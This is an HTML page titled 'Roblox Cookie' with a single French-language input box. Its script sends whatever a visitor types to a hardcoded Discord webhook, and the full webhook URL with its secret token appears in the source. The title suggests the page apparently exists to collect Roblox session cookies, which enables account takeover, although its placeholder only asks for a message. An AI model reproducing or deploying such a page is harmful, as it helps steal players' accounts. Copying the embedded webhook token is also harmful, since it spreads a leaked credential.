<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100%;
            height: 100vh;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* Animated background particles */
        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(147, 51, 234, 0.5);
            border-radius: 50%;
            animation: float 20s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(0) translateX(0);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) translateX(100px);
                opacity: 0;
            }
        }

        /* Title */
        .title {
            position: relative;
            z-index: 10;
            font-size: 48px;
            font-weight: 900;
            margin-bottom: 80px;
            background: linear-gradient(135deg, #ffffff, #a0a0a0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px rgba(147, 51, 234, 0.3);
            letter-spacing: 2px;
        }

        .title .highlight {
            color: #9333ea;
            background: linear-gradient(135deg, #7c3aed, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* Input bar styling */
        .text-bar {
            position: relative;
            z-index: 100;
            opacity: 1;
            pointer-events: all;
        }

        .text-bar-content {
            background: rgba(20, 20, 30, 0.95);
            border: 2px solid #9333ea;
            padding: 20px 30px;
            color: #ffffff;
            font-size: 14px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            box-shadow: 0 20px 60px rgba(147, 51, 234, 0.3);
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(10px);
        }

        .text-bar-prompt {
            color: #9333ea;
            white-space: nowrap;
            font-weight: bold;
        }

        .text-bar-input {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 14px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            outline: none;
            min-width: 400px;
        }

        .text-bar-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .text-bar-input:focus {
            box-shadow: 0 0 10px rgba(147, 51, 234, 0.5);
        }

        .status-message {
            position: fixed;
            top: 30px;
            right: 30px;
            color: #9333ea;
            font-size: 14px;
            z-index: 5;
            transition: opacity 0.3s ease;
            background: rgba(20, 20, 30, 0.95);
            padding: 15px 20px;
            border-radius: 8px;
            border: 1px solid rgba(147, 51, 234, 0.3);
            backdrop-filter: blur(10px);
        }

        .status-message.hidden {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="bg-particles" id="bgParticles"></div>

    <div class="title">
        Roblox <span class="highlight">Cookie</span>
    </div>

    <div class="text-bar" id="textBar">
        <div class="text-bar-content">
            <span class="text-bar-prompt">> </span>
            <input type="text" class="text-bar-input" id="userInput" placeholder="ENTRER LE MESSAGE..." autocomplete="off">
        </div>
    </div>

    <div class="status-message hidden" id="statusMessage"></div>

    <script>
        // Discord Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512483780990996510/M32pQZDO3_rDZ6_lY_lJDJB-wV6XTzKDqvHCWDWaJClelP8y79wqmgpLGJ09DtPMASMK';

        // Generate particles background
        function generateParticles() {
            const container = document.getElementById('bgParticles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 20 + 's';
                particle.style.animationDuration = (Math.random() * 10 + 20) + 's';
                particle.style.width = (Math.random() * 3 + 1) + 'px';
                particle.style.height = particle.style.width;
                container.appendChild(particle);
            }
        }

        generateParticles();

        // Input bar logic
        const userInput = document.getElementById('userInput');
        const statusMessage = document.getElementById('statusMessage');

        function showStatus(message, duration = 3000) {
            statusMessage.textContent = message;
            statusMessage.classList.remove('hidden');
            setTimeout(() => {
                statusMessage.classList.add('hidden');
            }, duration);
        }

        // Discord webhook integration
        userInput.addEventListener('keypress', async (e) => {
            if (e.key === 'Enter' && userInput.value.trim()) {
                const message = userInput.value.trim();
                userInput.value = '';
                userInput.disabled = true;

                try {
                    showStatus('📤 ENVOI DU MESSAGE...');

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: message,
                            username: 'Roblox Cookie',
                            avatar_url: 'https://images.emojiterra.com/twitter/v14.0/128px/1f36a.png'
                        })
                    });

                    if (response.ok) {
                        showStatus('✅ MESSAGE ENVOYÉ AVEC SUCCÈS');
                    } else {
                        showStatus('❌ ERREUR LORS DE L\'ENVOI');
                    }
                } catch (error) {
                    console.error('Erreur:', error);
                    showStatus('❌ ERREUR DE CONNEXION');
                } finally {
                    userInput.disabled = false;
                    userInput.focus();
                }
            }
        });

        userInput.focus();
    </script>
</body>
</html>
